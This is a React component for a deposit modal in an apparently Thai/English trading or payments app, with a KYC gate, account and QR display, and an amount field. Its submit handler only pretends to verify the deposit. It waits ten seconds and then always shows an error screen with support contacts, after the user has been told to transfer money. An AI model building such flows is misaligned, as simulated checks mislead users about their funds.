import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { motion, AnimatePresence } from "framer-motion";
import {
  X,
  ArrowDownCircle,
  ChevronRight,
  CheckCircle2,
  Copy,
  AlertCircle,
  Loader2,
  Construction,
} from "lucide-react";
import { supabase } from "../../lib/supabase";
import { depositMethods } from "../../data/depositMethods";
import qrImage from "../../assets/qr_placeholder.png";
import { SupportContactList } from "./SupportContactList";
import { useLanguage } from "../../contexts/LanguageContext";
import { useAuth } from "../../contexts/AuthContext";
import type { GlobalSettings } from "../../types";
import { UserX } from "lucide-react";

type DepositStep = "select" | "qr" | "submitted" | "kyc_required";

interface DepositModalProps {
  onClose: () => void;
}

export const DepositModal: React.FC<DepositModalProps> = ({ onClose }) => {
  const { t, language } = useLanguage();
  const { profile } = useAuth();
  const navigate = useNavigate();
  
  const [step, setStep] = useState<DepositStep>(() => {
    return profile?.kyc_status === 'verified' ? "select" : "kyc_required";
  });
  
  const [selected, setSelected] = useState<(typeof depositMethods)[0] | null>(
    null,
  );
  const [amount, setAmount] = useState("");
  const [copied, setCopied] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [settings, setSettings] = useState<Partial<GlobalSettings>>({});

  useEffect(() => {
    const fetchSettings = async () => {
      const { data } = await supabase
        .from("global_settings")
        .select("*")
        .eq("id", "main")
        .single();
      if (data) {
        setSettings(data);
      }
    };
    fetchSettings();
  }, []);

  // Handle ESC key to close modal
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "Escape") {
        onClose();
      }
    };
    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [onClose]);

  const copyAddress = () => {
    if (!selected) return;
    navigator.clipboard.writeText(selected.account);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleSubmit = async () => {
    setSubmitting(true);
    await new Promise((r) => setTimeout(r, 10000)); // simulate 10s verification
    setSubmitting(false);
    setStep("submitted");
  };

  const qrUrl = selected
    ? `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(selected.qrData)}&bgcolor=0f172a&color=818cf8&margin=10`
    : "";

  return (
    <AnimatePresence mode="wait">
      {/* ── Step 0: KYC Required ── */}
      {step === "kyc_required" && (
        <motion.div
          key="kyc_required"
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          exit={{ opacity: 0 }}
          className="flex flex-col"
        >
          <div className="p-6 border-b border-white/5 flex items-center justify-between relative bg-slate-900/50">
            <h2 className="text-lg font-black text-white flex items-center gap-2">
               <UserX size={20} className="text-amber-500" />
               {language === 'th' ? "ต้องยืนยันตัวตน (KYC)" : "KYC Verification Required"}
            </h2>
            <button
              onClick={onClose}
              className="p-1 rounded-full hover:bg-white/10 transition-colors text-slate-400 hover:text-white"
            >
              <X size={18} />
            </button>
          </div>

          <div className="p-6">
            <div className="flex flex-col items-center text-center mb-6">
              <div className="w-16 h-16 rounded-full bg-amber-500/10 border border-amber-500/20 flex items-center justify-center mb-4">
                <AlertCircle size={32} className="text-amber-400" />
              </div>
              <p className="text-slate-300 text-sm leading-relaxed mb-4">
                {language === 'th' 
                  ? (<>เพื่อความปลอดภัยของบัญชี กรุณายืนยันตัวตน{" "}
                      <button
                        onClick={() => { onClose(); sessionStorage.setItem("settings_active_tab", "profile"); navigate("/settings"); }}
                        className="text-amber-400 underline underline-offset-2 hover:text-amber-300 font-bold transition-colors cursor-pointer"
                      >(KYC)</button>{" "}
                      ให้เสร็จสมบูรณ์ก่อนทำรายการฝาก-ถอนเงินครับ</>) 
                  : (<>For account security, please complete{" "}
                      <button
                        onClick={() => { onClose(); sessionStorage.setItem("settings_active_tab", "profile"); navigate("/settings"); }}
                        className="text-amber-400 underline underline-offset-2 hover:text-amber-300 font-bold transition-colors cursor-pointer"
                      >KYC verification</button>{" "}
                      before depositing or withdrawing funds.</>)}
              </p>
              <p className="text-slate-500 text-xs font-bold uppercase tracking-widest">
                {language === 'th' ? "สถานะปัจจุบัน:" : "Current Status:"} <span className="text-amber-400">{profile?.kyc_status?.toUpperCase() || 'UNVERIFIED'}</span>
              </p>
            </div>

            <div className="mb-6">
              <SupportContactList settings={settings} />
            </div>

            <button
              onClick={onClose}
              className="w-full py-4 rounded-xl bg-white/10 hover:bg-white/15 text-white font-black text-sm transition-all"
            >
              {t('closeLabel')}
            </button>
          </div>
        </motion.div>
      )}

      {/* ── Step 1: select currency ── */}
      {step === "select" && (
        <motion.div
          key="select"
          initial={false}
          animate={{ opacity: 1, x: 0 }}
          exit={{ opacity: 0, x: -30 }}
          className="flex flex-col"
        >
          {/* Header */}
          <div className="p-6 border-b border-white/5 flex items-center justify-between relative bg-slate-900/50">
            <div>
              <h2 className="text-lg font-black text-white flex items-center gap-2">
                <ArrowDownCircle size={20} className="text-green-500" />
                {t('deposit')}
              </h2>
              <p className="text-slate-400 text-[10px] font-bold uppercase tracking-wider mt-0.5">
                {t('selectDepositMethod')}
              </p>
            </div>
            <button
              onClick={onClose}
              className="p-1 rounded-full hover:bg-white/10 transition-colors text-slate-400 hover:text-white"
            >
              <X size={18} />
            </button>
          </div>

          {/* Body */}
          <div className="p-6 space-y-3">
            {depositMethods.map((m) => (
              <button
                key={m.id}
                onClick={() => {
                  setSelected(m);
                  setStep("qr");
                }}
                className={`w-full flex items-center justify-between p-4 rounded-2xl bg-gradient-to-tr ${m.color} border ${m.border} hover:border-white/30 transition-all group`}
              >
                <div className="flex items-center gap-3">
                  <span className="text-2xl">{m.flag}</span>
                  <div className="text-left">
                    <p className="text-white font-bold text-sm">{m.label}</p>
                    <p className="text-slate-400 text-xs">{m.bank}</p>
                  </div>
                </div>
                <ChevronRight
                  size={16}
                  className="text-slate-500 group-hover:text-white group-hover:translate-x-1 transition-all"
                />
              </button>
            ))}
          </div>
        </motion.div>
      )}

      {/* ── Step 2: QR + account ── */}
      {step === "qr" && selected && (
        <motion.div
          key="qr"
          initial={{ opacity: 0, x: 30 }}
          animate={{ opacity: 1, x: 0 }}
          className="flex flex-col"
        >
          {/* Header */}
          <div className="p-6 border-b border-white/5 flex items-center justify-between relative bg-slate-900/50">
            <button
              onClick={() => setStep("select")}
              className="text-slate-400 hover:text-white text-xs font-bold flex items-center gap-1"
            >
              <ChevronRight size={14} className="rotate-180" /> {t('back')}
            </button>
            <button
              onClick={onClose}
              className="p-1 rounded-full hover:bg-white/10 transition-colors text-slate-400 hover:text-white"
            >
              <X size={18} />
            </button>
          </div>

          {/* Body */}
          <div className="p-6">
            <div className="text-center mb-6">
              <span className="text-3xl">{selected.flag}</span>
              <h2 className="text-lg font-black text-white mt-1">
                {selected.label}
              </h2>
              <p className="text-slate-400 text-xs">{selected.bank}</p>
            </div>

            {/* QR Code */}
            <div className="flex justify-center mb-6">
              <div className="w-44 h-44 bg-slate-900 rounded-2xl border border-white/10 overflow-hidden flex items-center justify-center p-2">
                <img
                  src={qrUrl}
                  alt="QR Code"
                  className="w-full h-full object-contain rounded-xl"
                  onError={(e) => {
                    (e.target as HTMLImageElement).src = qrImage;
                  }}
                />
              </div>
            </div>

            {/* Account / Address */}
            <div className="bg-white/5 rounded-xl p-4 mb-5 border border-white/5">
              <p className="text-slate-500 text-[10px] uppercase tracking-widest mb-1 font-bold">
                {selected.id === "usdt" ? t('walletAddress') : t('accountNumberLabel')}
              </p>
              <div className="flex items-center justify-between gap-2">
                <p className="text-white font-mono text-sm break-all">
                  {selected.account}
                </p>
                <button
                  onClick={copyAddress}
                  className={`shrink-0 flex items-center gap-1 text-[10px] font-black uppercase px-3 py-1.5 rounded-lg transition-all ${copied ? "bg-green-500/20 text-green-400" : "bg-white/10 text-slate-400 hover:text-white"}`}
                >
                  {copied ? <CheckCircle2 size={12} /> : <Copy size={12} />}
                  {copied ? t('copiedLabel') : t('copyLabel')}
                </button>
              </div>
            </div>

            {/* Amount */}
            <div className="space-y-2 mb-6">
              <label className="text-[10px] font-black text-slate-500 uppercase tracking-widest ml-1">
                {t('amountToDeposit')}
              </label>
              <div className="relative">
                <input
                  type="number"
                  inputMode="decimal"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  placeholder="0.00"
                  className="w-full bg-slate-900 border border-white/10 rounded-xl py-4 px-4 text-white font-bold focus:outline-none focus:ring-2 focus:ring-primary/40 transition-all placeholder:text-slate-700"
                />
              </div>
            </div>

            <div className="text-[10px] leading-relaxed text-amber-400/80 bg-amber-500/10 border border-amber-500/20 rounded-xl p-4 mb-6 font-bold uppercase tracking-wide">
              {language === 'th' ? '⚠️ โอนเงินแล้วกด "แจ้งโอนเงิน" เพื่อให้ทีมงานตรวจสอบและเติมยอดเข้าบัญชี' : '⚠️ After transfer, tap "Confirm Transfer" to notify our team.'}
            </div>

            {/* Under Development Notice */}
            <div className="flex items-center gap-2 mb-3 px-1">
              <Construction size={13} className="text-amber-400 shrink-0" />
              <span className="text-[10px] font-bold text-amber-400/80 uppercase tracking-wide">
                {t('underDevelopment') || 'อยู่ระหว่างพัฒนา — ระบบตรวจสอบอัตโนมัติ'}
              </span>
            </div>

            <button
              onClick={handleSubmit}
              disabled={!amount || submitting}
              className="w-full py-4 rounded-xl bg-green-500 hover:bg-green-600 text-white font-black text-lg shadow-xl shadow-green-500/20 transition-all active:scale-95 disabled:opacity-50 flex items-center justify-center gap-2"
            >
              {submitting ? (
                <Loader2 size={20} className="animate-spin" />
              ) : (
                <ArrowDownCircle size={20} />
              )}
              {submitting ? t('submittingDeposit') : t('notifyDeposit')}
            </button>
          </div>
        </motion.div>
      )}

      {/* ── Step 3: Error + contacts ── */}
      {step === "submitted" && (
        <motion.div
          key="submitted"
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          exit={{ opacity: 0 }}
          className="flex flex-col"
        >
          {/* Header */}
          <div className="p-6 border-b border-white/5 flex items-center justify-between relative bg-slate-900/50">
            <h2 className="text-lg font-black text-white flex items-center gap-2">
              <AlertCircle size={20} className="text-red-500" />
              {t('depositErrorTitle')}
            </h2>
            <button
              onClick={onClose}
              className="p-1 rounded-full hover:bg-white/10 transition-colors text-slate-400 hover:text-white"
            >
              <X size={18} />
            </button>
          </div>

          {/* Body */}
          <div className="p-6">
            <div className="flex flex-col items-center text-center mb-6">
              <div className="w-16 h-16 rounded-full bg-red-500/10 border border-red-500/20 flex items-center justify-center mb-4">
                <AlertCircle size={32} className="text-red-400" />
              </div>
              <p className="text-slate-400 text-sm leading-relaxed whitespace-pre-line">
                {t('depositErrorDesc')}
              </p>
            </div>

            <div className="mb-6">
              <SupportContactList settings={settings} />
            </div>

            <button
              onClick={onClose}
              className="w-full py-4 rounded-xl bg-white/10 hover:bg-white/15 text-white font-black text-base transition-all"
            >
              {t('closeLabel')}
            </button>
          </div>
        </motion.div>
      )}
    </AnimatePresence>
  );
};
